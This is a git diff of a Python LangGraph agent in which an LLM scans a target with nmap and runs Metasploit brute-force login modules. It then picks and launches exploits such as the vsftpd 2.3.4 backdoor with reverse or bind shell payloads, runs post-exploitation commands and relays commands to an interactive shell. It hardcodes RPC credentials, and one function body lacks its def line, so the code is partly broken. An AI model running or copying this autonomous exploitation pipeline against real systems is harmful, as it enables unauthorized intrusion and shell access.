@@ -1,3 +1,4 @@
+from re import S
 from typing import TypedDict, Annotated, List, Dict, Optional
 from langchain_openai import ChatOpenAI
 from langchain_groq import ChatGroq
@@ -12,11 +13,13 @@ from langgraph.prebuilt import ToolNode
 from typing import Any
 import docker
 import time
-import json
-import socket
+import re
 from pymetasploit3.msfrpc import MsfRpcClient
 
-# Enhanced State class with better typing
+METASPLOIT_IP="192.168.34.131"
+METASPLOIT_USER="msf"
+METASPLOIT_PASSWD="my-super-secret-password"
+METASPLOIT_PORT=55553
 class ReconState(TypedDict):
     ip: str
     user_input: str
@@ -24,6 +27,7 @@ class ReconState(TypedDict):
     vulns: List[str]
     exploitation_attempt: bool
     shell_success: bool
+    active_session_id: Optional[int] # <-- ADD THIS LINE
     report: str
     llm_provider: str
     api_key: str
@@ -99,43 +103,17 @@ def run_nmap_scan(target_ip: str, scan_type: str = "basic") -> str:
         
     except Exception as e:
         return f"Nmap scan failed: {str(e)}"
-    
-def wait_for_port(host: str, port: int, timeout: int = 30, interval: float = 0.5) -> bool:
-    """Wait until a TCP port is connectable."""
-    deadline = time.time() + timeout
-    while time.time() < deadline:
-        try:
-            with socket.create_connection((host, port), timeout=1):
-                return True
-        except (OSError, ConnectionRefusedError):
-            time.sleep(interval)
-    return False
-
-# You can start your container manually:
-# docker run -d --name kali-metasploit -e MSF_PASSWORD=password -p 55552:55552 kali-metasploit
-
-PREFERRED_SYNC_MODULES = {
-    '21': 'auxiliary/scanner/ftp/ftp_login',  # Returns immediate auth results
-    '22': 'auxiliary/scanner/ssh/ssh_login',  # Returns immediate auth results  
-    '23': 'auxiliary/scanner/telnet/telnet_login',  # Returns immediate results
-    '25': 'auxiliary/scanner/smtp/smtp_enum',  # Returns immediate enum results
-    '80': 'auxiliary/scanner/http/http_version',  # Returns immediate version
-    '139': 'auxiliary/scanner/smb/smb_login',  # Returns immediate auth results
-    '445': 'auxiliary/scanner/smb/smb_version',  # Returns immediate version
-    '3306': 'auxiliary/scanner/mysql/mysql_login',  # Returns immediate auth results
-    '5432': 'auxiliary/scanner/postgres/postgres_login'  # Returns immediate auth results
-}
 
 @tool
 def run_metasploit_auxiliary(target_ip: str, module_name: str, options: Dict[str, Any] = None) -> str:
     """
-    Run Metasploit auxiliary module using console interface to capture output
+    Run Metasploit auxiliary module using console interface to capture output and do vulnerability assesment
     """
     try:
         msf_client = MsfRpcClient(
-            password='my-super-secret-password',
-            user='msf', 
-            server='192.168.34.131',
+            password=METASPLOIT_PASSWD,
+            user=METASPLOIT_USER, 
+            server=METASPLOIT_IP,
             port=55553, 
             ssl=True
         )
@@ -161,9 +139,9 @@ def run_metasploit_auxiliary(target_ip: str, module_name: str, options: Dict[str
         # Add run command
         commands.append("run")
         
-        # Execute commands
-        full_output = []
         
+        full_output = []
+        # Execute commands
         for cmd in commands:
             console.write(cmd)
             # Wait a bit for command to process
@@ -197,55 +175,260 @@ def run_metasploit_auxiliary(target_ip: str, module_name: str, options: Dict[str
     except Exception as e:
         import traceback
         return f"Console execution failed: {str(e)}\nDetails: {traceback.format_exc()}"
-   
-@tool
-def run_metasploit_exploit(target_ip: str, module_name: str, payload: str, options: Dict[str, str] = None) -> str:
-    """
-    Run Metasploit exploit module
-    Args:
-        target_ip: Target IP address
-        module_name: Metasploit exploit module name
-        payload: Payload to use
-        options: Additional options for the module
-    """
-    client = docker.from_env()
-    
-    try:
-        container = client.containers.run('kali-metasploit',
-                                        detach=True,                        
-                                        remove=True,
-                                        network_mode="host")
-        time.sleep(15)
-        
-        msf_client = MsfRpcClient('password', host='localhost', port=55552)
-        exploit = msf_client.modules.use('exploit', module_name)
-        
-        # Set target and payload
-        exploit['RHOSTS'] = target_ip
-        exploit['PAYLOAD'] = payload
-        
-        # Set additional options
-        if options:
-            for key, value in options.items():
-                exploit[key] = value
-        
-        result = exploit.execute()
-        
-        # Check if we got a session
-        sessions = msf_client.sessions.list
-        if sessions:
-            return f"Exploit successful! Sessions: {sessions}"
-        else:
-            return f"Exploit executed but no sessions created: {str(result)}"
-        
-    except Exception as e:
-        return f"Metasploit exploit failed: {str(e)}"
 
-# Create tool node
-tools = [run_nmap_scan, run_metasploit_auxiliary, run_metasploit_exploit]
+    """
+    Interact with an established Metasploit shell session.
+    Args:
+        session_id: The ID of the active session to interact with.
+        command: The command to execute in the shell (e.g., 'whoami', 'ls -la').
+    """
+    print(f"  [Shell] Interacting with session {session_id}, running command: {command}")
+    try:
+        # Connect to Metasploit RPC
+        msf_client = MsfRpcClient(
+            password='my-super-secret-password',
+            user='msf', 
+            server='192.168.34.131',
+            port=55553, 
+            ssl=True
+        )
+
+        # Check if the session exists
+        if session_id not in msf_client.sessions.list:
+            return f"Error: Session {session_id} not found. Available sessions: {list(msf_client.sessions.list.keys())}"
+
+        # Get the shell object
+        shell = msf_client.sessions.session(session_id)
+        
+        # Write the command to the shell
+        shell.write(command)
+        
+        # Wait a moment for the command to execute
+        time.sleep(2)
+        
+        # Read the output
+        output = shell.read()
+        
+        if output:
+            return f"Command '{command}' executed on session {session_id}:\n---\n{output}\n---"
+        else:
+            return f"Command '{command}' executed, but produced no output."
+
+    except Exception as e:
+        return f"Failed to interact with shell {session_id}: {str(e)}"
+
+@tool
+def run_metasploit_exploit(target_ip: str, module_name: str, payload: str, options: Dict[str, Any] = None) -> str:
+    """
+    Run a Metasploit exploit module to establish a shell.
+    Args:
+        target_ip: Target IP address.
+        module_name: Metasploit exploit module name (e.g., 'unix/ftp/vsftpd_234_backdoor').
+        payload: Payload to use (e.g., 'cmd/unix/interact').
+        options: Additional options for the module.
+    """
+    print(f"  [Exploit] Attempting {module_name} with payload {payload} against {target_ip}")
+    try:
+        msf_client = MsfRpcClient(
+            password=METASPLOIT_PASSWD,
+            user=METASPLOIT_USER, 
+            server=METASPLOIT_IP,
+            port=55553, 
+            ssl=True
+        )
+
+        if not msf_client.authenticated:
+            return "Failed to authenticate with Metasploit RPC for exploitation."
+
+        # Get the exploit modules
+        try:
+            exploit = msf_client.modules.use('exploit', module_name)
+        except Exception as e:
+            return f"❌ FAILED: Unable to load exploit module '{module_name}': {str(e)}"
+        
+        # Set basic options
+        exploit['RHOSTS'] = target_ip
+        
+        # Validate and set payload
+        try:
+            # Get compatible payloads for this exploit
+            compatible_payloads = exploit.targetpayloads()
+            print(f"  [Debug] Available payloads: {compatible_payloads}")  # Show first 10
+            
+            # Check if requested payload is compatible
+            if payload not in compatible_payloads:
+                # Try to find a similar compatible payload
+                fallback_payloads = [
+                    'cmd/unix/interact',
+                    'generic/shell_reverse_tcp', 
+                    'generic/shell_bind_tcp',
+                    'cmd/unix/reverse'
+                ]
+                
+                chosen_payload = None
+                for fallback in fallback_payloads:
+                    if fallback in compatible_payloads:
+                        chosen_payload = fallback
+                        break
+                
+                if chosen_payload:
+                    print(f"  [Info] Payload '{payload}' not compatible, using '{chosen_payload}' instead")
+                    payload = chosen_payload
+                else:
+                    # Just use the first available payload
+                    if compatible_payloads:
+                        payload = compatible_payloads[0]
+                        print(f"  [Info] Using first available payload: '{payload}'")
+                    else:
+                        return f"❌ FAILED: No compatible payloads found for module '{module_name}'"
+            
+            exploit.payload = payload
+            
+        except Exception as e:
+            return f"❌ FAILED: Payload configuration error: {str(e)}"
+
+        # Add any additional options
+        if options and isinstance(options, dict):
+            for key, value in options.items():
+                try:
+                    exploit[key] = value
+                except Exception as e:
+                    print(f"[Warning] Could not set option {key}={value}: {str(e)}")
+
+        # Execute the exploit
+        try:
+            print(f"  [Exploit] Executing {module_name} with payload {payload}")
+            job_result = exploit.execute(payload=payload)
+            
+            # Handle different return types from execute()
+            if isinstance(job_result, dict) and 'job_id' in job_result:
+                job_id = job_result['job_id']
+                print(f"  [Exploit] Started as job ID: {job_id}. Waiting for session...")
+            elif isinstance(job_result, bool):
+                if job_result:
+                    print(f"  [Exploit] Exploit executed successfully. Waiting for session...")
+                    job_id = None
+                else:
+                    return f"❌ FAILED: Exploit execution returned False"
+            else:
+                print(f"  [Exploit] Exploit executed (return type: {type(job_result)}). Waiting for session...")
+                job_id = None
+
+        except Exception as e:
+            return f"❌ FAILED: Exploit execution failed: {str(e)}"
+
+        # Wait for session creation
+        print(f"  [Exploit] Waiting 15 seconds for session creation...")
+        time.sleep(15)
+
+        # Check for new sessions
+        try:
+            sessions = msf_client.sessions.list
+            print(type(msf_client.sessions))
+            print(f"  [Debug] Current sessions: {list(sessions)}")
+            
+            if sessions:
+                # Look for the most recent session
+                latest_session_id = max(sessions.keys(), key=int)
+                session = msf_client.sessions.session(latest_session_id)
+                
+                # Try different ways to get session info
+                session_info = "Unknown"
+                try:
+                    if hasattr(session, 'info'):
+                        session_info = session.info
+                    elif hasattr(session, 'description'):
+                        session_info = session.description  
+                    elif hasattr(session, 'type'):
+                        session_info = f"Type: {session.type}"
+                    
+                    # Check if session is from our exploit (basic heuristic)
+                    session_is_ours = True  # Assume it's ours if it's the latest
+                    
+                    if session_is_ours:
+                        return f"✅ SUCCESS: Exploit '{module_name}' created session {latest_session_id}. Session info: {session_info}"
+                
+                except Exception as session_error:
+                    print(f"  [Warning] Could not get session info: {session_error}")
+                    # Still consider it a success if we have a session
+                    return f"✅ SUCCESS: Exploit '{module_name}' created session {latest_session_id}."
+            
+            # No sessions found
+            if job_id:
+                try:
+                    job_info = msf_client.jobs.info(job_id)
+                    return f"❌ FAILED: Exploit '{module_name}' completed but no session was created. Job info: {job_info}"
+                except:
+                    return f"❌ FAILED: Exploit '{module_name}' completed but no session was created."
+            else:
+                return f"❌ FAILED: Exploit '{module_name}' completed but no session was created."
+
+        except Exception as e:
+            return f"❌ FAILED: Error checking for sessions: {str(e)}"
+
+    except Exception as e:
+        import traceback
+        return f"❌ FAILED: Exploitation failed with error: {str(e)}\nTraceback: {traceback.format_exc()}"
+
+
+@tool
+def interact_with_shell(session_id: int) -> str:
+    """
+    Start an interactive shell session with an established Metasploit shell.
+    
+    Args:
+        session_id: The ID of the active session to interact with.
+    
+    Returns:
+        str: A message indicating the session has ended or an error message.
+    """
+    print(f"[Shell] Starting interactive session with session {session_id}")
+    try:
+        # Initialize Metasploit RPC client
+        msf_client = MsfRpcClient('my-super-secret-password', user='msf', server='192.168.34.131', port=55553, ssl=True)
+        session_id_str = str(session_id)
+        
+        # Check if the session exists
+        if session_id_str not in msf_client.sessions.list:
+            return f"Error: Session {session_id} not found. Available sessions: {list(msf_client.sessions.list.keys())}"
+        
+        # Get the shell session
+        shell = msf_client.sessions.session(session_id_str)
+        
+        print(f"[Shell] Connected to session {session_id}. Type 'exit' to quit.")
+        print("Enter commands below (output may take a moment to appear):")
+        
+        while True:
+            # Get user input
+            command = input(f"[Session {session_id}]> ")
+            
+            # Check for exit condition
+            if command.lower() in ['exit', 'quit']:
+                print(f"[Shell] Closing interactive session {session_id}")
+                return f"Interactive session {session_id} ended."
+            
+            # Send command to the shell
+            shell.write(f"{command}\n")
+            
+            # Wait briefly and read output (adjust timing as needed)
+            time.sleep(1)  # Reduced delay for responsiveness
+            output = shell.read()
+            
+            # Display output
+            if output.strip():
+                print(f"\n[Output]\n---\n{output}\n---")
+            else:
+                print("[No output or command still processing]")
+                
+    except Exception as e:
+        error_msg = f"Failed to interact with shell {session_id}: {str(e)}"
+        print(error_msg)
+        return error_msg
+
+# Adding tools to the toollist
+tools = [run_nmap_scan, run_metasploit_auxiliary, run_metasploit_exploit, interact_with_shell]
 tool_node = ToolNode(tools)
 
-# Planning Node
 def planning_node(state: ReconState) -> ReconState:
     """Generate reconnaissance plan using LLM"""
 
@@ -282,8 +465,6 @@ def planning_node(state: ReconState) -> ReconState:
         
         state['messages'].append(AIMessage(content=response.content))
         state['plan']=response.content
-        ###THIS IS A SHORTCUT DUMMY OUTPUT REMOVE FOR PRODUCTION###
-        state['scan_results']['Agressive scan'] = 'This is a Nmap scan output, which is a network scanning tool used to discover hosts, services, and operating systems on a network.\n\nHere are the key findings:\n\n**Open ports**\n\n* 21/tcp: FTP service running (vsftpd 2.3.4)\n* 22/tcp: SSH service running (OpenSSH 4.7p1 Debian 8ubuntu1)\n* 23/tcp: Telnet service running (Linux telnetd)\n* 25/tcp: SMTP service running (Postfix smtpd)\n* 53/tcp: DNS service running (ISC BIND 9.4.2)\n* 80/tcp: HTTP service running (Apache httpd 2.2.8)\n* 111/tcp: RPC service running\n* 139/tcp: NetBIOS service running (Samba smbd 3.X - 4.X)\n* 445/tcp: NetBIOS service running (Samba smbd 3.X - 4.X)\n* 512/tcp: Exec service running (netkit-rsh rexecd)\n* 513/tcp: Login service running (OpenBSD or Solaris rlogind)\n* 514/tcp: TCP-wrapped service\n* 1099/tcp: Java RMI service running\n* 1524/tcp: Bindshell service running (Metasploitable root shell)\n* 2049/tcp: NFS service running\n* 2121/tcp: FTP service running (ProFTPD 1.3.1)\n* 3128/tcp: Squid HTTP proxy service\n* 3306/tcp: MySQL database service running (MySQL 5.0.51a-3ubuntu5)\n* 5432/tcp: PostgreSQL database service running (PostgreSQL DB 8.3.0 - 8.3.7)\n* 5900/tcp: VNC service running\n\n**Operating System**\n\nThe operating system is likely a Linux distribution, possibly Ubuntu or Debian.\n\n**Vulnerabilities**\n\nThere are several potential vulnerabilities identified:\n\n* The FTP server allows anonymous login.\n* The SSH server uses an outdated version of OpenSSH (4.7p1).\n* The DNS server runs on an outdated version of BIND (9.4.2).\n* The HTTP server runs on an outdated version of Apache (2.2.8).\n\n**Other findings**\n\nThe Nmap scan also identified several other services running on the target host, including:\n\n* A Java RMI service\n* A bindshell service\n* An NFS service\n* A VNC service\n\nOverall, this report suggests that the target host has several potential vulnerabilities and outdated software installations.'
         print("Planning completed successfully")
         
     except Exception as e:
@@ -294,6 +475,7 @@ def planning_node(state: ReconState) -> ReconState:
     
     return state
 
+#Helper function for the scan node
 def parse_scan_results(scan_output: str) -> Dict[str, List[str]]:
     """Parse nmap scan output to extract discovered services"""
     services = {}
@@ -320,13 +502,12 @@ def parse_scan_results(scan_output: str) -> Dict[str, List[str]]:
     
     return services
 
+#Helper function for the scan node 
 def determine_next_scan_type(state: ReconState, plan_content: str) -> tuple:
     """Determine the next scan type based on current state and plan"""
     scan_progression = state.get('scan_progression', [])
     discovered_services = state.get('discovered_services', {})
-    scan_results = state.get('scan_results', {})
     
-    # If no scans done yet, starts with fast discovery
     if not scan_progression:
         return "fast_scan", None
     
@@ -388,7 +569,6 @@ def scan_node(state: ReconState) -> ReconState:
     llm = get_llm(state['llm_provider'], state['api_key'], state['local_model'])
     llm_with_tools = llm.bind_tools(tools)
     
-    # CORRECTED PROMPT: This is now a template, not an f-string
     system_prompt = """You are a network scanning specialist executing a progressive scanning strategy.
 
     CURRENT SCAN PROGRESSION: {progression}
@@ -410,7 +590,7 @@ def scan_node(state: ReconState) -> ReconState:
     
     try:
         chain = prompt | llm_with_tools
-        # CORRECTED INVOKE: Pass all variables for the template here
+
         response = chain.invoke({
             "ip": state['ip'],
             "plan": plan_content,
@@ -497,30 +677,11 @@ def should_continue_scanning(state: ReconState) -> str:
         print(f"  → No more scans needed, moving to vulnerability assessment")
         return "vuln_assessment"
 
-def extract_services_from_text(text: str) -> Dict[str, List[str]]:
-    """Minimal regex-based service extraction as fallback"""
-    import re
-    services = {}
-    
-    # Simple regex to find port/service patterns
-    port_pattern = r'(\d+)/(tcp|udp)\s+open\s+(\S+)'
-    matches = re.findall(port_pattern, text, re.IGNORECASE)
-    
-    for port, protocol, service in matches:
-        if port not in services:
-            services[port] = []
-        services[port].append(f"{service} ({protocol})")
-    
-    return services
-
 # Vulnerability Assessment Node
 def vuln_assessment_node(state: ReconState) -> ReconState:
     """Simplified vulnerability assessment with cleaner prompting"""
     print("Entering vuln_assessment_node")
     state['current_step'] = 'vulnerability_assessment'
-    
-    if 'vulns' not in state:
-        state['vulns'] = []
     
     llm = get_llm(state['llm_provider'], state['api_key'], state['local_model'])
     llm_with_tools = llm.bind_tools(tools)
@@ -545,28 +706,38 @@ def vuln_assessment_node(state: ReconState) -> ReconState:
     # Simpler system prompt without complex formatting
     system_prompt = f"""You are a vulnerability assessment specialist. 
 
-Your task is to analyze the scan results and run appropriate Metasploit auxiliary modules to test for vulnerabilities.
+    Your task is to analyze the scan results and run appropriate Metasploit auxiliary modules to test for vulnerabilities.
 
-TARGET IP: {state['ip']}
+    TARGET IP: {state['ip']}
 
-AVAILABLE MODULES:
-- FTP services: scanner/ftp/ftp_version or scanner/ftp/anonymous  
-- SSH services: scanner/ssh/ssh_version
-- HTTP services: scanner/http/http_version
-- SMB services: scanner/smb/smb_version
-- MySQL services: scanner/mysql/mysql_version
-- Other services: use appropriate scanner modules
+    AVAILABLE MODULES:
+    - FTP services: scanner/ftp/ftp_version AND scanner/ftp/anonymous  
+    - SSH services: scanner/ssh/ssh_version AND scanner/ssh/ssh_login
+    - HTTP services: scanner/http/http_version AND scanner/http/dir_scanner
+    - SMB services: scanner/smb/smb_version AND scanner/smb/smb_login
+    - MySQL services: scanner/mysql/mysql_version AND scanner/mysql/mysql_login
+    - PostgreSQL: scanner/postgres/postgres_version
+    - Telnet: scanner/telnet/telnet_version
 
-INSTRUCTIONS:
-1. Look at the scan results to identify open services
-2. Run 2-3 appropriate auxiliary modules using run_metasploit_auxiliary
-3. For each module call, use this format:
-   - target_ip: the target IP
-   - module_name: exact module name like "scanner/ftp/ftp_version"  
-   - options: a dictionary with any extra options needed
+    CRITICAL INSTRUCTIONS:
+    1. You MUST call run_metasploit_auxiliary multiple times - once for EACH service you find
+    2. For EACH open port/service, run AT LEAST ONE auxiliary module
+    3. If you see FTP (port 21), run BOTH scanner/ftp/ftp_version AND scanner/ftp/anonymous
+    4. If you see SSH (port 22), run BOTH scanner/ssh/ssh_version AND scanner/ssh/ssh_login  
+    5. If you see HTTP (port 80), run BOTH scanner/http/http_version AND scanner/http/dir_scanner
+    6. If you see SMB (port 139/445), run BOTH scanner/smb/smb_version AND scanner/smb/smb_login
+    7. If you see MySQL (port 3306), run BOTH scanner/mysql/mysql_version AND scanner/mysql/mysql_login
 
-Execute the vulnerability assessment now."""
-    
+    EXAMPLE: If scan shows FTP, SSH, and HTTP services, you should make 6 tool calls:
+    - run_metasploit_auxiliary(target_ip="{state['ip']}", module_name="scanner/ftp/ftp_version")
+    - run_metasploit_auxiliary(target_ip="{state['ip']}", module_name="scanner/ftp/anonymous")  
+    - run_metasploit_auxiliary(target_ip="{state['ip']}", module_name="scanner/ssh/ssh_version")
+    - run_metasploit_auxiliary(target_ip="{state['ip']}", module_name="scanner/ssh/ssh_login")
+    - run_metasploit_auxiliary(target_ip="{state['ip']}", module_name="scanner/http/http_version")  
+    - run_metasploit_auxiliary(target_ip="{state['ip']}", module_name="scanner/http/dir_scanner")
+
+    Execute ALL relevant modules now - do not stop after just one!"""
+        
     try:
         # Use invoke directly instead of complex prompt template
         messages = [
@@ -597,22 +768,19 @@ Execute the vulnerability assessment now."""
             state['vulns'] = [
                 {
                     'type': 'assessment_summary',
-                    'content': analysis_response.content,
-                    'severity': 'analysis'
-                },
-                {
-                    'type': 'raw_results', 
-                    'content': results_content,
-                    'severity': 'raw'
+                    'content': analysis_response.content
                 }
+                # {
+                #     'type': 'raw_results', 
+                #     'content': results_content
+                # }
             ]
             
         else:
             print("No tool calls made during vulnerability assessment")
             state['vulns'] = [{
                 'type': 'no_assessment',
-                'content': 'No vulnerability assessment tools were executed',
-                'severity': 'warning'
+                'content': 'No vulnerability assessment tools were executed'
             }]
             
     except Exception as e:
@@ -630,63 +798,226 @@ Execute the vulnerability assessment now."""
 
 # Exploitation Node
 def exploitation_node(state: ReconState) -> ReconState:
-    """Attempt exploitation based on discovered vulnerabilities"""
+    """Analyze vulnerabilities and attempt multiple exploits to gain a shell."""
     print("Entering exploitation_node")
     state['current_step'] = 'exploitation'
     state['exploitation_attempt'] = True
-    state['shell_success'] = False
     
-    if not state['vulns']:
-        state['scan_results']['exploit'] = "No vulnerabilities to exploit"
+    # Store detailed exploit results for debugging
+    state['exploit_attempts'] = []
+    
+    vuln_summary = ""
+    for v in state.get('vulns', []):
+        vuln_summary += v.get('content', '') + "\n"
+
+    if not vuln_summary:
+        state['scan_results']['exploit'] = "No vulnerability data to attempt exploitation."
         return state
+
+    llm = get_llm(state['llm_provider'], state['api_key'], state['local_model'])
     
+    # Only bind exploit tools
+    exploit_tools = [run_metasploit_exploit]
+    llm_with_tools = llm.bind_tools(exploit_tools)
+
+    system_prompt = f"""You are an intelligent penetration testing expert who analyzes vulnerabilities and selects appropriate exploits.
+
+    TARGET IP: {state['ip']}
+
+    YOUR TASK: Analyze the vulnerability assessment results and intelligently select the most appropriate Metasploit exploit modules to try.
+
+    ANALYSIS APPROACH:
+    1. Look for specific service versions and known vulnerabilities
+    2. Match services to appropriate exploit modules
+    3. Choose payloads that are most likely to work
+    4. Try multiple different approaches if the first ones fail
+
+    COMMON METASPLOIT MODULES BY SERVICE:
+    - FTP (especially vsftpd 2.3.4): unix/ftp/vsftpd_234_backdoor
+    - SSH weak auth: auxiliary/scanner/ssh/ssh_login (but use exploit modules)  
+    - Samba/SMB: linux/samba/trans2open, linux/samba/is_known_pipename
+    - Apache/HTTP: multi/http/*, exploit/linux/http/*
+    - Bindshells: multi/handler with bind payloads
+    - Distcc: unix/misc/distcc_exec
+    - IRC (UnrealIRCd): unix/irc/unreal_ircd_3281_backdoor
+    - Java RMI: multi/misc/java_rmi_server
+    - MySQL: multi/mysql/*
+    - PostgreSQL: multi/postgres/*
+
+    PAYLOAD SELECTION GUIDE:
+    - cmd/unix/interact: Simple command shell (good for backdoors)
+    - cmd/unix/reverse: Reverse command shell
+    - generic/shell_reverse_tcp: More robust reverse shell
+    - generic/shell_bind_tcp: Bind shell (for direct connections)
+
+    INSTRUCTIONS:
+    1. You will be called multiple times - each time, choose a DIFFERENT exploit to try
+    2. Base your choices on the vulnerability assessment data
+    3. Start with the most promising exploits first
+    4. If previous attempts failed, try different approaches
+    5. Execute ONE exploit per call using run_metasploit_exploit
+
+    Be intelligent and adaptive in your choices based on the actual services and vulnerabilities found.
+    """
+    
+    max_attempts = 6
+    attempt_count = 0
+    attempted_modules = set()  # Track what we've already tried
+    
+    while attempt_count < max_attempts and not state.get('shell_success', False):
+        attempt_count += 1
+        print(f"\n--- Exploitation Attempt {attempt_count}/{max_attempts} ---")
+        
+        # Build context about previous attempts
+        previous_attempts = ""
+        if attempted_modules:
+            previous_attempts = f"\n\nPREVIOUS FAILED ATTEMPTS: {', '.join(attempted_modules)}\nDo NOT repeat these modules. Try something different."
+        
+        prompt_text = f"""Attempt #{attempt_count}: 
+        
+        Analyze the vulnerability data and choose the most appropriate exploit module to try next.
+        Consider the services found and their versions.{previous_attempts}
+        
+        Execute ONE exploit now using run_metasploit_exploit."""
+        
+        try:
+            response = llm_with_tools.invoke([
+                ("system", system_prompt),
+                ("human", f"Vulnerability Assessment Results:\n\n{vuln_summary}\n\n{prompt_text}")
+            ])
+            
+            state['messages'].append(response)
+            
+            print(f"--- LLM Response Attempt {attempt_count} ---")
+            if response.tool_calls:
+                print(f"Tool calls: {len(response.tool_calls)}")
+                for call in response.tool_calls:
+                    print(f"  Module: {call['args'].get('module_name', 'unknown')}")
+                    print(f"  Payload: {call['args'].get('payload', 'unknown')}")
+                    attempted_modules.add(call['args'].get('module_name', 'unknown'))
+            else:
+                print("No tool calls made")
+                continue
+            
+            if response.tool_calls:
+                # Execute the exploit
+                exploit_tool_node = ToolNode(exploit_tools)
+                tool_results = exploit_tool_node.invoke({"messages": [response]})
+                state['messages'].extend(tool_results['messages'])
+                
+                # Process results and capture detailed output
+                for msg in tool_results['messages']:
+                    if hasattr(msg, 'content'):
+                        # Store detailed attempt info
+                        attempt_info = {
+                            'attempt': attempt_count,
+                            'module': response.tool_calls[0]['args'].get('module_name', 'unknown'),
+                            'payload': response.tool_calls[0]['args'].get('payload', 'unknown'),
+                            'full_output': msg.content,
+                            'success': False
+                        }
+                        
+                        print(f"\n--- DETAILED EXPLOIT OUTPUT (Attempt {attempt_count}) ---")
+                        print(msg.content)
+                        print("--- END EXPLOIT OUTPUT ---\n")
+                        
+                        if "✅ SUCCESS" in msg.content:
+                            print(f"SUCCESS on attempt {attempt_count}!")
+                            state['shell_success'] = True
+                            attempt_info['success'] = True
+                            # Extract session ID
+                            match = re.search(r"session (\d+)", msg.content)
+                            if match:
+                                state['active_session_id'] = int(match.group(1))
+                                print(f"  Active session ID: {state['active_session_id']}")
+                                attempt_info['session_id'] = int(match.group(1))
+                        elif "❌ FAILED" in msg.content:
+                            print(f"Attempt {attempt_count} failed - analyzing output for debugging...")
+                            # Extract failure reason for debugging
+                            if "no session was created" in msg.content.lower():
+                                print("  Failure reason: No session created (exploit may have run but target not vulnerable)")
+                            elif "failed to start" in msg.content.lower():
+                                print("  Failure reason: Exploit failed to start (module/payload issue)")
+                            elif "connection refused" in msg.content.lower():
+                                print("  Failure reason: Connection refused (service not accessible)")
+                        
+                        state['exploit_attempts'].append(attempt_info)
+                
+                if state.get('shell_success', False):
+                    break
+                    
+        except Exception as e:
+            print(f"Error on attempt {attempt_count}: {str(e)}")
+            state['exploit_attempts'].append({
+                'attempt': attempt_count,
+                'error': str(e),
+                'success': False
+            })
+            continue
+            
+        # Small delay between attempts
+        import time
+        time.sleep(3)
+    
+    if not state.get('shell_success', False):
+        print(f"\nALL EXPLOITATION ATTEMPTS FAILED after {attempt_count} tries")
+        print(f"Modules attempted: {', '.join(attempted_modules)}")
+        
+        # Print summary of all attempts for debugging
+        print("\n=== EXPLOITATION SUMMARY ===")
+        for attempt in state.get('exploit_attempts', []):
+            print(f"Attempt {attempt.get('attempt', 'N/A')}: {attempt.get('module', 'N/A')} -> {'SUCCESS' if attempt.get('success') else 'FAILED'}")
+            if 'error' in attempt:
+                print(f"  Error: {attempt['error']}")
+
+    return state
+
+def post_exploitation_node(state: ReconState) -> ReconState:
+    """Perform basic enumeration after gaining shell access."""
+    print("Entering post_exploitation_node")
+    state['current_step'] = 'post_exploitation'
+    
+    if not state['shell_success'] or state['active_session_id'] is None:
+        return state
+        
+    session_id = state['active_session_id']
     llm = get_llm(state['llm_provider'], state['api_key'], state['local_model'])
     llm_with_tools = llm.bind_tools(tools)
+
+    system_prompt = f"""You are an ethical hacker with a shell on the target system (Session ID: {session_id}). 
+    Your goal is to perform basic enumeration.
     
-    system_prompt = """You are a penetration testing specialist.
-    Your goal is to attempt exploitation according to the mission plan.
+    INSTRUCTIONS:
+    1. Use the `interact_with_shell` tool to run commands.
+    2. Run the following commands ONE BY ONE to understand the system:
+        - `whoami` (to see the current user)
+        - `uname -a` (to get OS and kernel info)
+        - `id` (to see user and group info)
     
-    **Mission Plan:** {plan}
+    Execute these commands now.
+    """
     
-    Review the plan and the discovered vulnerabilities. If the plan allows for it, you MUST call the `run_metasploit_exploit` tool to attempt an exploitation."""
+    messages = [("system", system_prompt)]
     
-    prompt = ChatPromptTemplate.from_messages([
-        ("system", system_prompt),
-        ("human", "Attempt exploitation for IP: {ip}\nVulnerabilities: {vulns}\n!"),
-        MessagesPlaceholder(variable_name="messages")
-    ])
+    response = llm_with_tools.invoke(messages)
+    state['messages'].append(response)
     
-    try:
-        chain = prompt | llm_with_tools
-        response = chain.invoke({
-            "plan": state["plan"],
-            "ip": state['ip'],
-            "vulns": state['vulns'],
-            "messages": []
-        })
-        state['messages'].append(response)
-        
-        # Execute tool calls if any
-        if response.tool_calls:
-            tool_results = tool_node.invoke({"messages": [response]})
-            state['messages'].extend(tool_results['messages'])
-            
-            # Check for successful exploitation
-            for msg in tool_results['messages']:
-                if hasattr(msg, 'content'):
-                    state['scan_results']['exploit'] = msg.content
-                    if 'Exploit successful' in msg.content or 'Sessions:' in msg.content:
-                        state['shell_success'] = True
-        else:
-            state['scan_results']['exploit'] = "No exploitation attempted"
-            
-    except Exception as e:
-        error_msg = f"Exploitation failed: {str(e)}"
-        print(error_msg)
-        state['errors'].append(error_msg)
-        state['scan_results']['exploit'] = error_msg
-    
+    if response.tool_calls:
+        tool_results = tool_node.invoke({"messages": [response]})
+        state['messages'].extend(tool_results['messages'])
+        print(f"  [Post-Exploit] Ran {len(response.tool_calls)} enumeration commands.")
+
     return state
+
+# Helper function for the conditional edge
+def should_continue_to_post_exploit(state: ReconState) -> str:
+    """Determines whether to go to post-exploitation or to the final report."""
+    if state.get("shell_success"):
+        print("  [Graph] Shell success is TRUE. Routing to post_exploitation.")
+        return "post_exploitation"
+    else:
+        print("  [Graph] Shell success is FALSE. Routing to analysis.")
+        return "analysis"
 
 # Analysis and Reporting Node
 def analysis_node(state: ReconState) -> ReconState:
@@ -757,25 +1088,32 @@ def create_recon_workflow():
     workflow.add_node("scan", scan_node) 
     workflow.add_node("vuln_assessment", vuln_assessment_node)
     workflow.add_node("exploitation", exploitation_node)
+    workflow.add_node("post_exploitation", post_exploitation_node)
     workflow.add_node("analysis", analysis_node)
     workflow.add_node("tools", tool_node)
     
-    # Define the flow with conditional scanning
+    #Creating edges
     workflow.set_entry_point("planning")
-    # workflow.add_edge("planning", "scan")
-    workflow.add_edge("planning", "vuln_assessment")
-    # CONDITIONAL EDGE: Key change for Method 1
-    # workflow.add_conditional_edges(
-    #     "scan",
-    #     should_continue_scanning,  # Decision function
-    #     {
-    #         "scan": "scan",                    # Loop back for more scanning
-    #         "vuln_assessment": "vuln_assessment"  # Move to vulnerability assessment
-    #     }
-    # )
+    workflow.add_edge("planning", "scan")
+    workflow.add_conditional_edges(
+        "scan",
+        should_continue_scanning,  # Decision function
+        {
+            "scan": "scan",                    # Loop back for more scanning
+            "vuln_assessment": "vuln_assessment"  # Move to vulnerability assessment
+        }
+    )
     
     workflow.add_edge("vuln_assessment", "exploitation")
-    workflow.add_edge("exploitation", "analysis")
